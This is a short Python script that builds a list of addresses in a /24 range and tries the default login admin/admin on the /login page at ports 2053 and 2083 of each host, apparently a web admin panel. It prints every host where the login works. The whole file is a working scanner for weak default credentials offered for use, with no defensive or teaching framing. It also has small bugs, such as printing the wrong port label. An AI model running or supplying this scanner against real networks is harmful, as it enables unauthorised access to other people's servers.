import requests


timeout=2


def ip_list(iprange):
    my_file = open("ips.txt", "w")
    my_file.write("")
    my_file.close()
    x = 0
    my_file = open("ips.txt", "a+")
    while x != 257:
        my_file.write(f"{iprange}.{x}\n")
        x += 1

    my_file.close()


ip_list(input("input ip range(xxx.xxx.xxx) ==>"))


def checker83(ip: str, timeout):
    try:
        url = f"http://{ip}:2083/login"

        data = {'username': 'admin', 'password': 'admin'}

        x = requests.post(url, data, timeout=timeout)

        x = x.json()

        if (x["success"]) == True:
            return True
        else:
            return f"-------------------------{x['msg']}-------------------------"
    except:
        return False


def checker53(ip: str, timeout):
    try:
        url = f"http://{ip}:2053/login"

        data = {'username': 'admin', 'password': 'admin'}

        x = requests.post(url, data, timeout=timeout)

        x = x.json()

        if (x["success"]) == True:
            return True
        else:
            return x['msg']
    except:
        return False



x = 0
ips = open("ips.txt", "r").readlines()
for ip in ips:
    ip = ip.strip()
    result53 = checker53(ip,timeout)
    result83 = checker83(ip,timeout)

    if  result53 == False:
        pass
    elif result53 == True:
        print(ip,":2053")
    else:
        print(ip,":2053",result53)

    if result83 == False:
        pass
    elif result83 == True:
        print(ip,":2083")
    else:
        print(ip,":2053",result83)
    x= x+1
    print(x)










input("prees inter to close")
